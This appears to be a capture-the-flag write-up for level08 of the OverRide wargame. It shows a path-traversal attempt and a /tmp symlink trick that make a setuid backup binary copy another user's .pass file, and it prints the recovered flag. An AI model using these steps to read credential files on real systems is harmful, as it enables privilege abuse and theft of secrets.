level08@OverRide:~$ ./level08 "../../../../home/users/level09/.pass"
ERROR: Failed to open ./backups/../../../../home/users/level09/.pass


- opens backups/.log to write logs
- opens target file to read content with av[1]
- opens target file to write flag with strncat("./backups", av[1], strlen(av[1]))

strncat 

buffer 100

"./backups" (9)

+ 

"../../../../home/users/level09/.pass" (36)

"../../../../../../../../../../../../../../../../../../../../../../../../../../../../home/users/level09/.pass"


level08@OverRide:~$ ./level08 ".pass"
level08@OverRide:~$ ls -la backups/
total 8
drwxrwx---+ 1 level09 users    80 Nov 22 18:06 .
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
-rwxrwx---+ 1 level09 users    66 Nov 22 18:08 .log
-r--r-----+ 1 level09 users    41 Nov 22 18:06 .pass
level08@OverRide:~$ cat backups/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC


```
level08@OverRide:/tmp$ ls -la
total 0
drwxrwxrwt 4 root    root    120 Nov 23 08:49 .
drwxr-xr-x 1 root    root    220 Nov 23 08:31 ..
drwxrwxrwx 3 level08 level08 100 Nov 23 08:45 backups
drwxrwxr-x 3 level08 level08  60 Nov 23 08:33 home
lrwxrwxrwx 1 level08 level08  27 Nov 23 08:48 level08 -> /home/users/level08/level08
lrwxrwxrwx 1 level08 level08  25 Nov 23 08:49 .pass -> /home/users/level09/.pass
```
